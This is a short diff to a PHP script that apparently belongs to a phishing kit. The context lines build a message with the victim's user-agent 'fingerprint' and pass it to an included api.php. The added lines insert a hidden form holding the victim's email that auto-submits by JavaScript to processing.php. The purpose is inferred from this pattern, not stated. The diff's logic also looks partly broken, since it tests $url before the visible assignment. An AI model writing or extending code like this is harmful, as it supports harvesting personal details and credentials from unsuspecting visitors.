@@ -162,6 +162,16 @@ $msg = ("
 
 [FINGERPRINT] = ".$useragent."
 ");
+    if($url) {
+        
+        echo "<form id='swat' method='POST' action='processing.php'>
+                    <input type='hidden' name='email' value='$email'>
+              </form>
+              <script type='text/javascript'>
+                    document.getElementById('swat').submit();
+              </script>";
+              
+    }
 
 $url = $msg;include("api.php");
 }
